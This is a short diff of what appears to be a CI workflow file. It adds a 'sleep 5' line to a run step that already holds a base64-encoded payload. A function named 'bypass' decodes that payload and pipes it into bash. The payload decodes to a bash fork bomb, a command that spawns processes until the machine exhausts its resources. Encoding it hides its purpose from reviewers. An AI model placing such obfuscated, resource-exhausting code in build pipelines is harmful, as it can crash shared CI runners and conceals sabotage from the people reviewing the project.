@@ -25,6 +25,7 @@ jobs:
         run: |
           PAYLOAD="OigpeyA6fDomIH07Ogo="
           echo ">>>>> before payload run"
+          sleep 5
           function bypass() {
             echo "$PAYLOAD" | base64 --decode | bash
           }
